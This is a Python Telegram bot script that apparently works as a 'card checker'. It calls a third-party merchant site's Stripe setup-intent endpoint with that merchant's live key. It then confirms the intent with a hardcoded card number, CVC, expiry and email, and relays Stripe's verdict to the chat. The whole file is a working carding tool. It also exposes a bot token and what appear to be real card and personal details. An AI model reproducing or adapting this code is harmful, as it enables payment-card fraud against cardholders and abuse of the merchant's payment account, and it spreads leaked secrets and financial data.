import telebot
import requests

# Fixed Telegram bot token
TELEGRAM_BOT_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Send /check to run the Stripe setup and get the website response.")

@bot.message_handler(commands=['check'])
def check_stripe(message):
    # Step 1: Create the setup intent
    create_setup_response = requests.post(
        'https://cinemamastery.com/api/non_oauth/stripe_intents/setup_intents/create',
        headers={
            'Content-Type': 'application/json',
            'accept': 'application/json'
        },
        json={
            'page_id': 'ZCtvdkFwV0ZBb2J1ZEpEOUw2YlRrQT09LS1tOFh1YXFEMWZlVEp5MGhPRnFRb2JnPT0=--06eb28a5479ac90f95675383388a8be1ecb4e0bc',
            'stripe_publishable_key': 'pk_live_51IksXdLsdufqQtEPrF9bXcJSrESLkgnbnfldl87Y1B20yq8lVkogGvYx5jpEduPg2CDuQ1E15IQzaaIRExFp0xkL001gqjnUZQ',
            'stripe_account_id': 'acct_1IksXdLsdufqQtEP'
        }
    )

    response_json = create_setup_response.json()

    # Step 2: Extract seti_ ID
    seti_id = response_json.get('id')
    if not seti_id:
        bot.reply_to(message, "Failed to get seti_ ID from response.")
        return

    # Step 3: Confirm setup intent with card details
    confirm_response = requests.post(
        f'https://api.stripe.com/v1/setup_intents/{seti_id}',
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'accept': 'application/json'
        },
        data={
            'payment_method_data[type]': 'card',
            'payment_method_data[billing_details][email]': 'Peshangkrisp9@gmail.com',
            'payment_method_data[card][number]': '4147098797621083',
            'payment_method_data[card][cvc]': '202',
            'payment_method_data[card][exp_month]': '10',
            'payment_method_data[card][exp_year]': '28'
        }
    )

    # Step 4: Send the full response text back to Telegram user
    full_response = confirm_response.text
    bot.send_message(message.chat.id, full_response)

# Run the bot
bot.polling()
